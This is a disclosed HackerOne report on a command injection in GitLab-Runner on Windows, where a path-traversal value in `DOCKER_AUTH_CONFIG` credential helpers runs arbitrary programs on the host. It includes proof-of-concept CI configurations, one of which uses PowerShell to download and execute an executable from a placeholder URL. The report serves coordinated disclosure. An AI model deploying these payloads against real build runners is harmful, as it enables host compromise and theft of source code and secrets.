---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/os-command-injection
  - env/cloud
  - stack/gitlab
  - os/windows
  - vuln/path-traversal
  - vuln/command-injection
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2020-11-04
submitted: 2020-08-10T15:08:42.114Z
bounty_usd: null
votes: 77
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "ajxchapman"
source: "https://hackerone.com/reports/955016"
title: "GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection"
---
# GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 77 | **Program:** GitLab | **Disclosed:** 2020-11-04

- Report: [https://hackerone.com/reports/955016](https://hackerone.com/reports/955016)
- CWE: OS Command Injection
- Submitted: 2020-08-10T15:08:42.114Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary

GitLab-Runner, when running on Windows with a `docker` executor, is vulnerable to Command Injection via the `DOCKER_AUTH_CONFIG` build variable. Injected commands are executed on the container host, not within a Docker container, as such could compromise all future builds which are executed by the runner.

## Details

When using a `docker` executor, the `DOCKER_AUTH_CONFIG` build variable is processed as a JSON docker config file. One of the possible config values, `credHelpers`, specifies a hash of repository keys to docker Credential Helper application values. 

```json
{
  "credHelpers" : {
    "repo.example.com" : "application"
  }
}
```

When `gitlab-runner` attempts to create an image, each key value pair in the `credHelpers` hash is processed, and the corresponding Credential Helper application is executed by `gitlab-runner` in order to obtain credentials for the repository. This execution occurs on the docker container host, `gitlab-runner` directly `exec`s the Credential Helper to receive it's output.

Docker Credential Helpers, as processed by the `github.com/docker/cli/cli/config/credentials/native_store.go:NewNativeStore` function are prepended with the string `docker-credential-` before execution:

```go
// github.com/docker/cli/cli/config/credentials/native_store.go
const (
	remoteCredentialsPrefix = "docker-credential-"
	tokenUsername           = "<token>"
)

...

func NewNativeStore(file store, helperSuffix string) Store {
	name := remoteCredentialsPrefix + helperSuffix
	return &nativeStore{
		programFunc: client.NewShellProgramFunc(name),
		fileStore:   NewFileStore(file),
	}
}
```

This is sufficient to prevent command injection on *nix based systems, however Windows based systems can exploit path traversal to execute arbitrary programs as Credential Helpers. E.G. a `credHelper` of `{"helper" : :/../../../../../../../../Windows/System32/calc.exe"}` would result in the application `docker-credential-/../../../../../../../../Windows/System32/calc.exe` being executed, which on a Windows system would resolve to `C:/Windows/System32/calc.exe`. This only affects Windows based systems, as Windows does not verify path directories exist during path normalization. In this case, Windows does not check the directory `docker-credential-` exists as it is normalized out due to the path traversal characters following it.

The Credential Helper execution is ultimately called in the `gitlab-runner` code by `gitlab.com/gitlab-org/gitlab-runner/helpers/docker/auth/auth.go:readConfigsFromCredentialsHelper` calling the `github.com/docker/cli/cli/config/credentials/native_store.go:Get` `docker` API method:

```go
// gitlab.com/gitlab-org/gitlab-runner/helpers/docker/auth/auth.go
func readConfigsFromCredentialsHelper(config *configfile.ConfigFile) (map[string]types.AuthConfig, error) {
	helpersAuths := make(map[string]types.AuthConfig)

	for registry, helper := range config.CredentialHelpers {
		store := credentials.NewNativeStore(config, helper)

		newAuths, err := store.Get(registry)
```

The issue exists as the `gitlab-runner` code does not check for path traversals in Credential Helper values before passing them to the `docker` API.

In it's simplest form, this issue can be exploited to execute any program that exists on the system running `gitlab-runner` with uncontrolled arguments. However, arbitrary programs can be executed by setting up a `service` which downloads an executable payload to the `C:\Builds` volume mounted directory, and setting the full path to the volume mounted directory as the `credHelper` value, e.g.:
```json
{
  "helper" : "/../../../../../../../../ProgramData/docker/volumes/runner-aapjznsw-project-20444930-concurrent-0-cache-cde2929a41401004cf47d36bdb2eb380/_data/testfile.exe"
}
```

This works as the following three conditions are met:
1. The source of the volume mounted `build` directory is predictable per build
1. The `DOCKER_AUTH_CONFIG` is processed once for each created container
1. The build container is created after all `service` containers have been started.

## Steps to reproduce

* Register and run a runner on a Windows system with a docker executor and a tag of `windows-docker-runner`.
* Create a Build with the following `.gitlab-ci.yml`:

```yml
services:
  - alpasdfasdfasdfasdfasdfidne:3.5
variables:
  DOCKER_AUTH_CONFIG: "{\"credHelpers\" : {\"repo.example.com\" : \"/../../../../../../../../Windows/System32/calc.exe\"}}"

build1:
  tags:
    - windows-docker-runner
  stage: build
  script:
    - whoami
```

When `gitlab-runner` picks up the build it will process the `DOCKER_AUTH_CONFIG` json and launch the CredentialHelper specified, in this case `calc.exe`.

Confirmed vulnerable version configurations are:
* gitlab-runner 13.2.2 on Windows 10 with Docker Toolbox (`docker` runner)
* gitlab-runner 13.2.2 on Windows 2019 with Docker Enterprise (`docker-windows` runner)

## Impact

Exploitation of this issue could compromise the underlying system on which `gitlab-runner` runs, exposing source code, build artifacts and other sensitive data to a malicious user.

## What is the current *bug* behavior?

gitlab-runner passes unsanitized JSON values from the `DOCKER_AUTH_CONFIG` build variable to the `github.com/docker/cli/cli/config/credentials/native_store.go:NewNativeStore` `docker` API function, which may result in command injection on Windows systems.

## What is the expected *correct* behavior?

JSON supplied via the `DOCKER_AUTH_CONFIG` build variable should be processed to ensure it does not contain malicious content.

## Relevant logs and/or screenshots

{F943021}

## Output of checks

`gitlab-runner --version`
```
Version:      13.2.2
Git revision: a998cacd
Git branch:   refs/pipelines/172580057
GO version:   go1.13.8
Built:        2020-07-30T14:52:23+0000
OS/Arch:      windows/amd64
```

`config.toml`
```toml
concurrent = 1
check_interval = 0

[session_server]
  session_timeout = 1800

[[runners]]
  name = "windows"
  url = "https://gitlab.com"
  token = "█████"
  executor = "docker-windows"
  [runners.custom_build_dir]
  [runners.cache]
    [runners.cache.s3]
    [runners.cache.gcs]
  [runners.docker]
    tls_verify = false
    image = "mcr.microsoft.com/windows/servercore:1809"
    privileged = false
    disable_entrypoint_overwrite = false
    oom_kill_disable = false
    disable_cache = false
    volumes = ["c:\\cache"]
    shm_size = 0
```

## Impact

Exploitation of this issue could compromise the underlying system on which `gitlab-runner` runs, exposing source code, build artifacts and other sensitive data to a malicious user.

## Timeline

- **Report Filed**
- **2020-08-10** @ajxchapman: Full payload to download and execute an arbitrary program from a webserver (`gitlab-runner` on Windows 2019 with `docker-windows` runner):
```yml
variables:
  DOCKER_AUTH_CONFIG: "{\"credHelpers\" : {\"repo.example.com\" : \"/../../../../../../../../ProgramData/docker/volumes/runner-aapjznsw-project-20444930-concurrent-0-cache-cde2929a41401004cf47d36bdb2eb380/_data/poc.exe\"}}"

services:
  - name: mcr.microsoft.com/windows/servercore:1809
    entrypoint: ["powershell"]
    command: ["Invoke-WebRequest -Uri http://example.com/poc.exe -OutFile c:/builds/poc.exe; sleep 100"]

image: sdfgdsfgsdfgdsfgdsfg:124

build1:
  tags:
    - windows-docker-runner
  stage: build
  script:
    - sleep 200
```

* `aapjznsw` in `runner-aapjznsw-project-20444930-concurrent` should be replaced with the runner name, available from the CI/CD settings or build logs.
* `20444930` in `runner-aapjznsw-project-20444930-concurrent` should be replaced with the project ID
* `http://example.com/poc.exe` should be replaced with a URL from which to download a PoC executable.
- **2020-08-10** @gitlab-securitybot: Hi @ajxchapman,

Thank you for submitting this report! We will investigate the issue as soon as
possible, and should get back within a week.

Please do not submit your report or ask about its status through additional
channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2020-08-12** @ngeorge: @ajxchapman,
Thank you for submitting this report. This issue is now escalated to the engineering team for verification and analysis and is tracked here https://gitlab.com/gitlab-org/gitlab-runner/-/issues/26725. We will get back to you once a feedback is received from the team.

Best Regards,
GitLab Security Team
- **2020-08-20** @ajxchapman: Hi @ngeorge, I've just noticed this bug has not been triaged yet. If you require any further details to help with triage please feel free to reach out.

Thanks,
Alex
- **Report Severity Updated**
- **Report Triaged**
- **2020-08-22** @gitlab-securitybot: ETA for fix:

Hi @ajxchapman,

The issue you reported is currently scheduled to be fixed by 2020-09-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Severity Updated**
- **Report Resolved**
- **2020-10-05** @ajxchapman: Hi @ngeorge, thanks for the update. Would you be able to confirm when this issue will be awarded? As I understand it, the GitLab policy is to award bounties on resolution or 45 days from triage. As it happens both of those conditions were met today.

Thanks,
Alex
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
